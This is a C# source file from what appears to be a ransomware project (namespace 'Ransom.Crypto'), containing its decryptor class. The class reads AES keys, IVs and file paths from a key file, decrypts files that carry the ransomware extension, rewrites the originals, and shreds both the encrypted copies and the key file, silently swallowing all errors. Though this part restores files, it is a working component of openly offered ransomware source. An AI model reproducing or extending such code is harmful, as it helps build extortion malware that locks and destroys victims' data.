using Shared;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;

namespace Ransom.Crypto
{
    public class PublicDecryptor
    {
        public static void TryDecrypt()
        {
            try
            {
                Dictionary<Aes, string> keysPaths = GetAesPaths(Config.DECRYPTED_KEYS_PATH);
                if (keysPaths == null)
                    return;

                foreach (KeyValuePair<Aes, string> _ in keysPaths)
                {
                    byte[] encodedData = File.ReadAllBytes(_.Value);
                    string decryptedData = DecryptAESData(encodedData, _.Key);

                    string newPath = _.Value.Replace(Config.RANSOMWARE_EXTENSION, string.Empty);
                    using FileStream fs = File.Open(newPath, FileMode.OpenOrCreate);
                    using StreamWriter sw = new StreamWriter(fs);

                    sw.Write(decryptedData);
                    Utils.ShredFile(_.Value);
                }

                Utils.ShredFile(Config.DECRYPTED_KEYS_PATH);
            }
            catch (Exception) { }
        }

        private static Dictionary<Aes, string>? GetAesPaths(string sPath)
        {
            if (sPath == null || !File.Exists(sPath))
                return null;

            Dictionary<Aes, string> aesPaths = new Dictionary<Aes, string>();
            using (StreamReader sr = new StreamReader(sPath))
            {
                string? line;
                while ((line = sr.ReadLine()) != null)
                {
                    string[] lineAsArr = line.Split(" ");
                    string[] ivPath = lineAsArr[1].Split("\t");

                    byte[] key = Convert.FromBase64String(lineAsArr[0]);
                    byte[] iv = Convert.FromBase64String(ivPath[0]);
                    string path = ivPath[1];

                    Aes aes;
                    using (aes = Aes.Create())
                    {
                        aes.Key = key;
                        aes.IV = iv;
                    }

                    aesPaths.Add(aes, path);
                }
            }

            return aesPaths;
        }

        private static string DecryptAESData(byte[] encryptedData, Aes aesKey)
        {
            ICryptoTransform decryptor = aesKey.CreateDecryptor(aesKey.Key, aesKey.IV);
            using MemoryStream msDecrypt = new MemoryStream(encryptedData);
            using CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read);
            using StreamReader srDecrypt = new StreamReader(csDecrypt);

            string plainText = srDecrypt.ReadToEnd();
            return plainText;
        }
    }
}
